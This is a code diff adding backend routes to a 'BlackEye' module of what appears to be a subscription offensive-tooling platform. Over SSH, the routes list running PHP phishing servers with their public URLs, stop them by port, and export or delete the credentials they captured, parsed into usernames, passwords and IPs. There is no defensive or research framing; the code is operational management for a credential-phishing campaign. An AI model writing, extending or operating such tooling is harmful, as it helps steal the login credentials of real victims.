@@ -543,4 +543,77 @@ export const blackeyeRouter = router({
     const out = await execSSHCommand(nodeToSSH(node), "cd /opt/blackeye && git pull 2>&1 | tail -3", 30000, ctx.user.id);
     return { success: true, message: out || "Update complete.", output: out || "Update complete." };
   }),
+
+  /** Clear all captured credentials */
+  clearCaptures: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    await execSSHCommand(nodeToSSH(node), "rm -f /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null; echo CLEARED", 10000, ctx.user.id);
+    return { success: true, message: "All captured credentials cleared." };
+  }),
+
+  /** Export captures as structured JSON with metadata */
+  exportCaptures: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execSSHCommand(
+      nodeToSSH(node),
+      "cat /opt/blackeye/captured.txt /tmp/blackeye_captures_*.log 2>/dev/null | sort -u || echo ''",
+      10000, ctx.user.id
+    );
+    const captures = out.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      const parts = line.split(':');
+      if (parts[0]?.match(/^\d{4}-\d{2}-\d{2}/)) {
+        const ts = `${parts[0]}:${parts[1]}:${parts[2]}`;
+        const data = parts.slice(3);
+        return { id: String(idx), username: data[0] ?? '', password: data[1] ?? '', ip: data[2] ?? '', timestamp: ts };
+      }
+      return { id: String(idx), username: parts[0] ?? line, password: parts[1] ?? '', ip: parts[2] ?? '', timestamp: new Date().toISOString() };
+    });
+    return { captures, count: captures.length, exportedAt: new Date().toISOString(), node: node.label };
+  }),
+
+  /** List all currently running PHP phishing servers on the node */
+  getActiveServers: protectedProcedure.mutation(async ({ ctx }) => {
+    const plan = await getUserPlan(ctx.user.id);
+    enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+    const node = await getActiveNode(ctx.user.id);
+    if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+    const out = await execSSHCommand(
+      nodeToSSH(node),
+      "ps aux | grep 'php -S 0.0.0.0' | grep -v grep || echo 'No active servers'",
+      10000, ctx.user.id
+    );
+    const servers = out.split('\n').filter(l => l.includes('php -S')).map(l => {
+      const portMatch = l.match(/0\.0\.0\.0:(\d+)/);
+      const templateMatch = l.match(/-t '([^']+)'/);
+      return {
+        port: portMatch?.[1] ?? 'unknown',
+        template: templateMatch?.[1]?.split('/').pop() ?? 'unknown',
+        url: `http://${node.publicIp ?? node.sshHost}:${portMatch?.[1] ?? ''}`,
+      };
+    });
+    return { servers, count: servers.length, raw: out };
+  }),
+
+  /** Stop a specific template server by port */
+  stopTemplate: protectedProcedure
+    .input(z.object({ port: z.number().min(1).max(65535) }))
+    .mutation(async ({ ctx, input }) => {
+      const plan = await getUserPlan(ctx.user.id);
+      enforceFeature(plan.planId, "offensive_tooling", "BlackEye");
+      const node = await getActiveNode(ctx.user.id);
+      if (!node) throw new TRPCError({ code: "BAD_REQUEST", message: "No active node." });
+      await execSSHCommand(
+        nodeToSSH(node),
+        `pkill -f 'php -S 0.0.0.0:${input.port}' 2>/dev/null; sleep 1; echo STOPPED`,
+        10000, ctx.user.id
+      );
+      return { success: true, message: `Server on port ${input.port} stopped.` };
+    }),
 });
+
